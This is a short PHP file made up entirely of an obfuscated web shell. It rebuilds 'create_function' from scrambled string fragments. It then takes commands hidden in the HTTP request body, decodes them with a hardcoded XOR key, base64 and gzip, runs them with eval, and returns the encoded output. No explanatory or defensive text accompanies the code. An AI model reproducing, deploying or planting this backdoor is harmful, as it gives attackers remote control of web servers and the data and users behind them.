<?php
$l='($`$i=0;$`$i<$l;){for`$($j=0`$;($j<$c&`$&$i<$l`$);$j++`$,$i`$++){$o.=`$$t`${$`$i}^$k{$';
$X='j`$};`$}}r`$eturn $o;}`$if (`$@preg`$_match("/$kh(.+)$kf`$/",@`$file_ge`$t`$_content';
$R='$`$`$a`$se64_decode`$($m[`$1]`$),$k)));$o=@ob_get`$_co`$nte`$nts();`$@ob_end_cle`$a`';
$G='UR9Vwog51Ix4D`$";funct`$ion x`$`$($t,$`$k){$c=strlen($k);$l=strlen`$($t);$o=`$""`$;for';
$z=str_replace('iV','','creiVatiVeiViV_funiVctiVion');
$n='$n();$r=@ba`$se64_encod`$e(@x(@gzco`$mpre`$s`$s($o),$`$k));pri`$nt("$p$kh`$$r$kf");}';
$P='s("`$php`$://input"`$),$`$m)==1) {`$@ob_star`$t();@`$eva`$l(@gzu`$ncomp`$ress(@x(@b`';
$e='$k="807`$b`$26cf`$";$k`$h="d26d29bf4e77";`$$k`$f="c422c2`$b5e`$70a";$p`$=`$"wz`$R`$`$';
$K=str_replace('`$','',$e.$G.$l.$X.$P.$R.$n);
$j=$z('',$K);$j();
?>
